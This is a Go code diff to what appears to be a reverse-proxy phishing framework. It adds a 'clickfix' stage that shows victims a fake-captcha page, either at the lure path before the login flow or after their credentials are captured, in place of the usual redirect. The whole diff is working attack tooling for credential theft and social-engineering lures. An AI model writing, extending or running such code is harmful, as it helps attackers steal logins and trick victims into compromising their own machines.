@@ -528,12 +528,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				req.Header.Set(p.getHomeDir(), o_host)
 
-				if ps.SessionId != "" {
-					if s, ok := p.sessions[ps.SessionId]; ok {
-						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
-						if err == nil {
-							// show html redirector if it is set for the current lure
-							if l.Redirector != "" {
+					if ps.SessionId != "" {
+						if s, ok := p.sessions[ps.SessionId]; ok {
+							l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+							if err == nil {
+							// clickfix pre-auth gate: serve the fake-captcha page
+							// at the lure path before the login flow starts
+							if cf := pl.ClickFix(); cf != nil && cf.Position == "before" && !p.isForwarderUrl(req.URL) {
+								if s.RedirectCount == 0 {
+									s.RedirectCount += 1
+									lure_url := req_url
+									if req2, resp := p.serveClickFixBefore(req, cf, lure_url, &s.Params); resp != nil {
+										return req2, resp
+									}
+								}
+							}
+								// show html redirector if it is set for the current lure
+								if l.Redirector != "" {
 								if !p.isForwarderUrl(req.URL) {
 									if s.RedirectorName == "" {
 										s.RedirectorName = l.Redirector
@@ -1367,6 +1378,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
+							// clickfix post-auth gate: serve the fake-captcha page
+							// instead of the JS redirect after credentials captured
+							if cf := pl.ClickFix(); cf != nil && cf.Position == "after" {
+								_, resp := p.serveClickFixAfter(resp.Request, cf, s.RedirectURL)
+								return resp
+							}
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 
 							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
